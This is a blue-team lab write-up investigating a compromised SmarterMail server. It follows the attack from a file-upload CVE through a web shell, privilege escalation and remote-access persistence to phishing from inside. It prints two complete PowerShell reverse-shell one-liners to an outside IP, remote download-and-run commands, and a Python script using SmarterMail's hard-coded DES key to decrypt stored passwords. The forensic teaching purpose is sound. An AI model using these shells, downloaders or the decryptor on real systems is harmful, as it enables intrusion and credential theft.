---
title: MailFall
date: 2026-11-12
summary: A hard DFIR investigation stemming from identified anomalous authentication activity and suspicious process executions consistent with an active adversary operating within the internal network.
platform: BTLO
difficulty: ''
category: Incident Response / Digital Forensics
image: https://blueteamlabs.online/storage/labs/69c67ae7ade4451d11cec688bf0f6ef4e2c8ebc4.png
featured: false
tools:
  - EvtxECmd
  - MFTECmd
  - Timeline Explorer
  - CyberChef
  - DB Browser for SQLite
  - Python
mitre:
  - T1190
  - T1505.003
  - T1059.001
  - T1134.001
  - T1219
  - T1543.003
  - T1567
  - T1555.003
  - T1136
  - T1114.003
  - T1534
  - T1021.002
tags:
  - DFIR
  - Log analysis
  - Digital forensics
draft: false
---

|||
|---|---|
| **Platform** | Blue Team Labs Online (BTLO) |
| **Lab** | MailFall |
| **Category** | Incident Response / Digital Forensics |
| **Author** | Đặng Đắc Tài |
| **Date** | 12/11/2026 |
| **Victim** | `MAIL01.SOPRANOS.local` (SmarterMail, `192.168.45.136`) |

***

## 1. TL;DR

The attacker reached the mail server from another internal machine, `192.168.45.130`. On 28 February 2026 at **02:31:55 UTC** a web shell, `uzg856.aspx_0.aspx`, appeared in `C:\inetpub\wwwroot`. The SmarterMail build on the server (**9406**) is older than the fix for **CVE-2025-52691**, an unauthenticated arbitrary file upload that leads to remote code execution.

From the web shell the attacker opened a PowerShell reverse shell to **`18.195.175.194:9001`**, dropped **GodPotato** (`gp.exe`) to get SYSTEM, and called back again on port **`15234`**. As SYSTEM they ran a VBScript that downloaded **GotoHTTP**, saved it as `C:\Users\Public\xixixi.exe`, installed it as the service **`TTXN GotoHTTP Agent`**, and sent its connection details to `go1.kmm5tn.ceye[.]io`.

With full control they logged in to the SmarterMail admin panel at **03:10:01 UTC**, created a hidden administrator, **`backup_sa`** (password `Hacked1!`), turned on automatic forwarding, and used the new account to email four domain users a "backup failure" message telling them to run a VBScript as Administrator.

***

## 2. Scenario and scope

The SOPRANOS domain runs a SmarterMail server, `MAIL01`, that also hosts the domain's webmail. The evidence is a triage collection of the mail server (`Desktop\Artefacts\MailFall\2026-02-28T104342_output\`): the `$MFT` and `$J`, Windows event logs, IIS logs, the SmarterMail data and log folders, and user profiles including Edge's databases.

The questions follow the attack from the first foothold to the phishing email sent from inside.

> **Time zone.** The server runs Pacific Standard Time (**UTC−8** in February). SmarterMail's own logs and the email headers use local time; the IIS logs, the `$MFT` and the Edge timestamps are UTC. All times in this writeup are **UTC** unless marked otherwise.

## 3. Tools

| Purpose | Tool |
| --- | --- |
| Parse event logs to CSV | EvtxECmd |
| Parse `$MFT` and `$J` to CSV | MFTECmd |
| Filter and review the CSVs | Timeline Explorer |
| Decode the PowerShell payloads | CyberChef |
| Edge `Web Data` and `History` | DB Browser for SQLite |
| Read the decryption key from the SmarterMail DLL | .NET decompiler |
| Decrypt the stored password | Python (`pycryptodome`) |

```powershell
.\EvtxECmd.exe -d '..\Artefacts\MailFall\2026-02-28T104342_output\C\Windows\System32\winevt\Logs' --csv ..\Output\
.\MFTECmd.exe -f '..\Artefacts\MailFall\2026-02-28T104342_output\C\$MFT' --csv ..\Output\
.\MFTECmd.exe -f '..\Artefacts\MailFall\2026-02-28T104342_output\C\$Extend\$J' --csv ..\Output\
```

***

## 4. Consolidated timeline (UTC)

| Time | Event | Source |
| --- | --- | --- |
| 2026-02-24 21:50:54 * | Explicit-credential logon as `JohnnyBoy` to `Sopranos-DC`, network address `192.168.45.130`, port 445 | Security 4648 |
| 2026-02-28 02:31:55 | Web shell `uzg856.aspx_0.aspx` created in `C:\inetpub\wwwroot` | `$MFT` |
| 2026-02-28 02:33:24 | First web shell command: `cmd=whoami` | IIS log |
| 2026-02-28 02:39:45 | Web shell runs encoded PowerShell: reverse shell to `18.195.175.194:9001` | IIS log |
| 2026-02-28 02:43:04 | `gp.exe` (GodPotato) created in `C:\Windows\Temp` | `$MFT` |
| 2026-02-28 02:45:24 | Second reverse shell, now as SYSTEM, to `18.195.175.194:15234` | PowerShell 400 |
| 2026-02-28 02:49:32 | `xixixi.exe` (GotoHTTP) created; service `TTXN GotoHTTP Agent` installed | `$MFT`, System 7045 |
| 2026-02-28 03:10:01 | Login to the SmarterMail admin panel as `admin` | SmarterMail log, Edge autofill |
| 2026-02-28 03:10:33 | "Show password" for `mail_svc@SOPRANOS.local` | SmarterMail log |
| 2026-02-28 03:14:31 | User `backup_sa` created | SmarterMail log |
| 2026-02-28 03:19:59 | Automated forwarding enabled for the domain `SOPRANOS.local` | SmarterMail log |
| 2026-02-28 03:25:36 | Login to webmail as `backup_sa` | SmarterMail log |
| 2026-02-28 03:29:29 | Phishing email "URGENT: Backup System Requires Immediate Action" sent | SmarterMail log, `.eml` |
| 2026-02-28 03:30:13 | That message deleted from Sent Items | SmarterMail log |
| 2026-02-28 03:32:11 | Sent again, with a ⚠ added to the subject | SmarterMail log |

\* Time as displayed in Event Viewer on the analysis machine; not converted.

***

## 5. Analysis by phase

### Phase 1 — Arriving from inside: `192.168.45.130`

Filtering the Security log for logon events, `192.168.45.130` shows up in **4624** network logons (logon type 3, Kerberos).

![Event 4624 network logon over Kerberos from 192.168.45.130](/uploads/mailfall-01.png)

Following that address back, its first appearance is a **4648** (logon with explicit credentials): the local `Administrator` on `MAIL01` used the credentials of the domain account **`JohnnyBoy`** to reach `cifs/Sopranos-DC.SOPRANOS.local` over **port 445 (SMB)**, with network address `192.168.45.130`. The same address also sends a large part of the scanning traffic in the IIS logs. This is the internal machine the attacker moved from.

![Event 4648: Administrator using JohnnyBoy's credentials towards the domain controller over SMB](/uploads/mailfall-02.png)

### Phase 2 — Initial access: CVE-2025-52691 and the web shell

`MailService.dll` reports version **100.0.9406**, that is SmarterMail build 9406. **CVE-2025-52691** is an unauthenticated arbitrary file upload in SmarterMail before build **9413** that leads to remote code execution.

![MailService.dll properties: version 100.0.9406](/uploads/mailfall-03.png)

The upload folder, `C:\Program Files (x86)\SmarterTools\SmarterMail\Service\App_Data\upload`, holds a file named **`@_fakeID`**. Its content is a minimal ASPX command shell: it takes the `cmd` query parameter, runs it with `cmd.exe /c` and writes the output back into the page. This is most likely the file the vulnerability let the attacker upload.

![ASPX command shell that runs the cmd query parameter](/uploads/mailfall-04.png)

In the `$MFT`, the web shell that was actually called, **`uzg856.aspx_0.aspx`**, was created in the IIS web root `C:\inetpub\wwwroot` at **2026-02-28 02:31:55**. An `.aspx` file appearing in `wwwroot` is a classic web shell location.

![$MFT: uzg856.aspx_0.aspx created in C:\inetpub\wwwroot](/uploads/mailfall-05.png)

The IIS log shows the first command sent to it at **02:33:24**: `cmd=whoami`.

![IIS log: first request to the web shell with cmd=whoami](/uploads/mailfall-06.png)

### Phase 3 — Reverse shell to `18.195.175.194:9001`

At **02:39:45** the web shell received `cmd=powershell -e JAB...`, a Base64-encoded PowerShell command, among the scanning noise.

![IIS log: web shell request carrying an encoded PowerShell command](/uploads/mailfall-07.png)

Decoding it in CyberChef (From Base64, then UTF-16LE) gives a standard TCP reverse shell to **`18.195.175.194` on port `9001`**:

![CyberChef decoding the -e payload](/uploads/mailfall-08.png)

```powershell
$client = New-Object System.Net.Sockets.TCPClient("18.195.175.194",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

### Phase 4 — Privilege escalation with GodPotato

A web shell normally runs as the IIS application pool account, not as SYSTEM. Filtering the `$MFT` for `.exe` files created on 28 February gives mostly Edge update files, plus two in unusual places: `C:\Windows\Temp\gp.exe` and `C:\Users\Public\xixixi.exe`.

![$MFT filtered to .exe files created on 2026-02-28](/uploads/mailfall-09.png)

![gp.exe created at 02:43:04 and xixixi.exe at 02:49:32](/uploads/mailfall-10.png)

`gp.exe` was created at **02:43:04**, and its file description is **GodPotato**: a public tool that abuses `SeImpersonatePrivilege`, which IIS service accounts hold, to run commands as SYSTEM.

![gp.exe properties: description GodPotato](/uploads/mailfall-11.png)

It worked. The Windows PowerShell log (event **400**, whose `HostApplication` field records the command line) shows a second copy of the same reverse shell at **02:45:24**, now pointing at port **`15234`**:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("18.195.175.194",15234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Phase 5 — Persistence: GotoHTTP as a service

The same event 400 entries show the SYSTEM shell downloading a script:

```powershell
Invoke-WebRequest -Uri https://7070-ppxcx-a1-3gg5ufwp666ee644-1300076834.tcb.qcloud.la/test/zcgo/zcgo1.vbs -OutFile C:\Users\public\zcgo1.vbs
```

![PowerShell event 400 entries: the zcgo1.vbs download and the encoded commands](/uploads/mailfall-12.png)

`zcgo1.vbs` is short. Its comments are pinyin (romanized Chinese): *xiazaiwenjian* "download file", *jianchawenjian* "check file", *zhixingwenjian* "run file". It:

1. downloads `go.exe` from the same host and saves it as **`C:\Users\Public\xixixi.exe`**;
2. checks that the file is at least 2.5 MB, and otherwise reports `xiazaishibai or daxiaobudui` ("download failed or wrong size") to the upload URL;
3. runs the executable;
4. uses `C:\Users\Public\gotohttp.ini` as its config file and **`http://go1.kmm5tn.ceye.io`** as the upload URL, which is where the remote tool's details are sent.

![zcgo1.vbs: download, size check, execute, upload URL](/uploads/mailfall-13.png)

`xixixi.exe` has the original file name **GotoHTTP.exe**, a browser-based remote control tool.

![xixixi.exe properties: original name GotoHTTP.exe](/uploads/mailfall-14.png)

A public example of GotoHTTP shows how its `gotohttp.ini` is laid out: `name` is the **Computer ID** and `tmp` is the **Access Code**, the two values someone needs to take control from `gotohttp.com`.

![Public example of GotoHTTP: Computer Id and Access Code next to gotohttp.ini](/uploads/mailfall-15.png)

The `gotohttp.ini` on this server gives `name = 258475923` and `tmp = 1078`. Those are the values the script sends out: **`258475923_1078`**.

![gotohttp.ini on the server](/uploads/mailfall-16.png)

To survive a reboot it was installed as a service. Filtering the System log for **7045** (service installed) gives one entry, at **02:49:32**, with image path `"C:\Users\Public\xixixi.exe" service` and service name **`TTXN GotoHTTP Agent`**.

![Event 7045: image path of the new service](/uploads/mailfall-17.png)

![Event 7045 payload: service name TTXN GotoHTTP Agent](/uploads/mailfall-18.png)

### Phase 6 — Into the mail panel

SmarterMail's administrative log (local time, UTC−8) shows the rest. At 19:10:01 local, **03:10:01 UTC**, `admin` logs in to webmail. About thirty seconds later it asks to **show the password** of `mail_svc@SOPRANOS.local`. At **03:14:31** it adds the user **`backup_sa`**, sets its mailbox forwarding, enables **Automated Forwarding for the whole domain** (03:19:59), impersonates `backup_sa`, and then logs in as it at **03:25:36**.

![SmarterMail administrative log from the admin login to the phishing email](/uploads/mailfall-19.png)

How did the attacker know the admin password? Edge's `Web Data` database in `JohnnyBoy`'s profile on the server stores the values typed into web forms. The `admin` entry was **last used at 03:10:01**, the same second as the panel login. The same table holds `backup_sa` (03:14:31, the second the account was created) and a `P@SSw0rd!` entry submitted at 03:10:34, right after the "show password" call. The most likely explanation is that the browser filled in the saved credentials.

![Edge autofill table: admin, backup_sa and P@SSw0rd! with their timestamps](/uploads/mailfall-20.png)

Edge's `History` shows what was done in the panel: the `sysadmin/manage` pages for `SOPRANOS.local`, domain accounts, password requirements, system administrators, and tabs titled `backup_sa@SOPRANOS.local`.

![Edge history: visits to the SmarterMail sysadmin pages](/uploads/mailfall-21.png)

### Phase 7 — The hidden admin's password

`backup_sa`'s `settings.json` stores its password encrypted: `password_encrypted: "xmObHnZQMoN+Q4KNDiNXWA=="`, last changed at `2026-02-28T03:14:31`, the moment it was created.

![settings.json for backup_sa with password_encrypted](/uploads/mailfall-22.png)

SmarterMail encrypts these with DES. The key and IV are hard-coded in the `CryptographyHelper` class of `SmarterMail.Standard.dll` as `keymap1` and `keymap2`.

![CryptographyHelper: keymap1](/uploads/mailfall-23.png)

![CryptographyHelper: keymap2, the key and IV used for user passwords](/uploads/mailfall-24.png)

With `keymap2` as key and IV, a short script based on a public decryptor gives the password back:

```python
import base64
from Crypto.Cipher import DES

# keymap2 from CryptographyHelper in SmarterMail.Standard.dll
KEY = bytes([180, 63, 132, 209, 16, 180, 233, 145])
IV = bytes([1, 216, 174, 230, 73, 173, 146, 39])

def decrypt_password(ciphertext):
    decrypted = DES.new(KEY, DES.MODE_CBC, IV).decrypt(base64.b64decode(ciphertext))
    return decrypted[:-decrypted[-1]].decode("utf-8")  # strip PKCS#7 padding

print(decrypt_password("xmObHnZQMoN+Q4KNDiNXWA=="))
```

```text
Hacked1!
```

### Phase 8 — Phishing from inside

The message `backup_sa` sent at 03:29:29 is still in its **Deleted Items** folder. It was sent to **tony, corrado, JohnnyBoy and mail_svc**, with `Reply-To: backup_sa@SOPRANOS.local` and the subject *"URGENT: Backup System Requires Immediate Action - Possible Data Loss Risk"*. It claims the workstation has failed its backups for 72 hours and asks the reader to run, **as Administrator**:

```text
cmd /c Powershell Invoke-WebRequest -Uri https://cdn-edge-83af.com/backup-tool.vbs -OutFile C:\Windows\Temp\backup-register.vbs & cmd /c C:\Windows\Temp\backup-register.vbs
```

The body is quoted-printable, so the URL is split across lines (`backup-t=` / `ool.vbs`). Joined, it is **`https://cdn-edge-83af.com/backup-tool.vbs`**.

![The phishing email: recipients and the command to run](/uploads/mailfall-25.png)

The log also shows the first copy deleted from Sent Items at 03:30:13 and a second one sent at 03:32:11 with a ⚠ in the subject.

***

## 6. Lab Q&A

| \# | Question | Answer |
| --- | --- | --- |
| 1 | We know the attacker didn't start at the mail server. They moved laterally from another internal workstation. What is the IP address of that originating machine? (5 points) | `192.168.45.130` |
| 2 | Upon arrival, the attacker uploaded a web shell to establish persistence. When exactly did that upload occur? (6 points) | `2026-02-28 02:31:55` |
| 3 | The initial compromise wasn't a brute force—they exploited a specific vulnerability. What CVE gave them their first foothold? (8 points) | `CVE-2025-52691` |
| 4 | From the web shell, the attacker launched a reverse shell to their command and control server. What IP and port did they connect to first? (6 points) | `18.195.175.194:9001` |
| 5 | Needing higher privileges, the attacker downloaded a well-known privilege escalation tool. What is its original name? (8 points) | `God Potato` |
| 6 | The privilege escalation worked. They now had a SYSTEM shell calling back on a new port. What port is that? (6 points) | `15234` |
| 7 | With SYSTEM access, the attacker downloaded a script to ensure they wouldn't lose access. What is the full URL of that script? (8 points) | `https://7070-ppxcx-a1-3gg5ufwp666ee644-1300076834.tcb.qcloud.la/test/zcgo/zcgo1.vbs` |
| 8 | The script installed a remote control tool that was configured to start automatically via a Windows service. What is the name of that service? (8 points) | `TTXN GotoHTTP Agent` |
| 9 | The downloaded script exfiltrated the remote tool's configuration details. What domain did it send this data to? (6 points) | `http://go1.kmm5tn.ceye.io` |
| 10 | The exfiltrated data included the computer ID and access code needed for remote control. Provide them in the format ComputerID_AccessCode. (6 points) | `258475923_1078` |
| 11 | Now in full control, the attacker logged into the mail panel as administrator, likely using saved passwords from the browser. When did that login occur? (5 points) | `2026-02-28 03:10:01` |
| 12 | Inside the panel, they created a hidden admin account for future access. What are the email and password for this account? (10 points) | `backup_sa@SOPRANOS.local:Hacked1!` |
| 13 | Exactly when was this new account with admin privilege created? (6 points) | `2026-02-28 03:14:31` |
| 14 | Using their new account, the attacker sent a malicious email to a select group of users. Which domain users received it? Sort them alphabetically. (6 points) | `corrado, JohnnyBoy, mail_svc, tony` |
| 15 | The email contained a link to a file, instructing recipients to download and run it. What is the full URL of that payload? (6 points) | `https://cdn-edge-83af.com/backup-tool.vbs` |

***

## 7. IOCs

| Type | Value | Note |
| --- | --- | --- |
| IP | `192.168.45.130` | Internal machine the attacker moved from |
| IP:port | `18.195.175[.]194:9001` | First reverse shell (web shell user) |
| IP:port | `18.195.175[.]194:15234` | Second reverse shell (SYSTEM) |
| File | `C:\inetpub\wwwroot\uzg856.aspx_0.aspx` | Web shell |
| File | `...\SmarterMail\Service\App_Data\upload\@_fakeID` | Uploaded ASPX command shell |
| File | `C:\Windows\Temp\gp.exe` | GodPotato |
| File | `C:\Users\Public\zcgo1.vbs` | Downloader and exfiltration script |
| File | `C:\Users\Public\xixixi.exe` | GotoHTTP (original name `GotoHTTP.exe`) |
| File | `C:\Users\Public\gotohttp.ini` | GotoHTTP Computer ID and Access Code |
| URL | `hxxps://7070-ppxcx-a1-3gg5ufwp666ee644-1300076834.tcb.qcloud[.]la/test/zcgo/` | Hosts `zcgo1.vbs` and `go.exe` |
| Domain | `go1.kmm5tn.ceye[.]io` | Receives the GotoHTTP details |
| Service | `TTXN GotoHTTP Agent` | Persistence |
| Account | `backup_sa@SOPRANOS.local` | Hidden SmarterMail administrator |
| URL | `hxxps://cdn-edge-83af[.]com/backup-tool.vbs` | Phishing payload |
| Email subject | `URGENT: Backup System Requires Immediate Action - Possible Data Loss Risk` | Internal phishing |

***

## 8. MITRE ATT&CK

| Tactic | Technique | ID | Evidence |
| --- | --- | --- | --- |
| Lateral Movement | Remote Services: SMB/Windows Admin Shares | T1021.002 | 4648 with `JohnnyBoy`'s credentials to `cifs/Sopranos-DC`, port 445 |
| Initial Access | Exploit Public-Facing Application | T1190 | CVE-2025-52691 file upload on SmarterMail build 9406 |
| Persistence | Server Software Component: Web Shell | T1505.003 | `uzg856.aspx_0.aspx`, `@_fakeID` |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | Encoded reverse shells to `18.195.175.194` |
| Privilege Escalation | Access Token Manipulation: Token Impersonation/Theft | T1134.001 | GodPotato (`gp.exe`) |
| Command and Control | Remote Access Software | T1219 | GotoHTTP as `xixixi.exe` |
| Persistence | Create or Modify System Process: Windows Service | T1543.003 | `TTXN GotoHTTP Agent` (event 7045) |
| Exfiltration | Exfiltration Over Web Service | T1567 | GotoHTTP details sent to `go1.kmm5tn.ceye.io` |
| Credential Access | Credentials from Password Stores: Credentials from Web Browsers | T1555.003 | `admin` filled from Edge autofill at 03:10:01 |
| Persistence | Create Account | T1136 | SmarterMail administrator `backup_sa` |
| Collection | Email Collection: Email Forwarding Rule | T1114.003 | Domain-wide automated forwarding, `backup_sa` forward list |
| Lateral Movement | Internal Spearphishing | T1534 | "URGENT: Backup System…" to four domain users |

***

## 9. Lessons learned

- **Patch internet-facing mail servers first.** SmarterMail build 9406 was a few builds short of the fix for an unauthenticated upload that hands out code execution.
- A new `.aspx` file in `wwwroot` or in SmarterMail's `App_Data\upload`, and `w3wp.exe` spawning `cmd.exe` or `powershell.exe`, are both worth an alert of their own.
- Services whose binary lives in `C:\Users\Public` or `C:\Windows\Temp` are almost never legitimate.
- Remote control tools such as GotoHTTP and "request bin" services such as `*.ceye.io` should be blocked or at least alerted on at the proxy.
- Do not let browsers save administrator passwords on servers. Here the browser handed the attacker the mail panel.
- Watch the mail platform's own admin log: a new administrator, a "show password" call and domain-wide forwarding within ten minutes is not routine work.
- An email from an internal address that asks users to run commands as Administrator is phishing, whoever sent it.

## 10. References

- CVE-2025-52691: https://nvd.nist.gov/vuln/detail/CVE-2025-52691
- Replicating CVE-2025-52691 (SmarterMail unauthenticated file upload to RCE): https://rodelllemit.medium.com/replicating-cve-2025-52691-an-rce-via-unauthenticated-arbitrary-file-upload-critical-vulnerability-e6c796270192
- Active Directory logs for investigators: https://zcr.ai/blog/active-directory-log-en/
- SmarterMail password decryptor this writeup's script is based on: https://github.com/hieuit0903/htbacademy/blob/main/MediumLab/DanglingTree/SmartermailDecryptpass.py
- GodPotato: https://github.com/BeichenDream/GodPotato
- MITRE ATT&CK: https://attack.mitre.org/
- Eric Zimmerman tools (EvtxECmd, MFTECmd, Timeline Explorer)
